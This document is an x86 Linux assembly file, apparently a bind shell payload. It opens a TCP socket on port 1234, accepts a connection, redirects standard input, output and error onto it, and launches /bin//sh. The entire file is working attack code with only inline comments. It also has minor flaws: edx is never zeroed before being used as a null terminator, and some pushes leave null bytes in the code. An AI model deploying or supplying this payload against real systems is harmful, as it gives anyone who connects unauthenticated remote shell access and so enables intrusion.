global _start
section .text
_start:

xor eax,eax ;clearing out eax
mov al,0x66 ;create socket syscall
xor ebx,ebx ;clearing out ebx
inc ebx ;set ebx to 1
push 0 ; for TCP
push 1 ; for SOCK_STREAM
push 2 ; for AF_INET
mov ecx, esp ; now ecx has a pointer to our 3 arguments
int 0x80 ;initiate syscall!
mov edi, eax ;store the socket fd safely


mov al, 0x66 ; socketcall
mov bl, 2 ;  socket type bind

push 0	; IP to bind, we're going to use 0.0.0.0 to accept any connection
push word 0xd204; port number
push word 0x02 ;AF_INET, seperated pushes to easily change port

mov ecx, esp ; now ecx has a pointer to the struct

push 16; size
push ecx ; pointer to the bind struct
push edi ; the socket fd
mov ecx, esp ; ecx now has all the arguments

int 0x80 ; initate syscall!

mov al, 0x66 ; socketcall
mov bl, 0x4 ; for listen()
push 0 ; backlog
push edi ; fd
mov ecx, esp; arguments for listen()

int 0x80 ; initiate syscall


mov al, 0x66; socketcall
mov bl, 0x5; accept()
push 0 ; addrlen = 0
push 0 ; *addr = 0
push edi; bound FD
mov ecx, esp ; arguments for accept()
int 0x80 ; accept connection!


xchg eax, ebx ;put the new socket FD in ebx

xor ecx, ecx ;starting with stdin
mov al, 0x3f ;syscall dup2
int 0x80 ;init syscall

mov al, 0x3f ;dup2 syscall
inc ecx ;ecx = 1, stdout
int 0x80 ;init syscall

mov al, 0x3f ;dup2 syscall
inc ecx ;ecx = 2, stderr
int 0x80 ;init syscall

push edx ; null terminator
push dword 0x68732f6e ;"hs/n"
push dword 0x69622f2f ;"ib//"
mov ebx,esp ;ebx has now pointer to the filename
push edx ;null terminator
push ebx ;push string pointer to stack
mov ecx,esp ;ecx has a pointer to a pointer that points to the string
mov al,0xb ;exev syscall
int 0x80 ;initate syscall
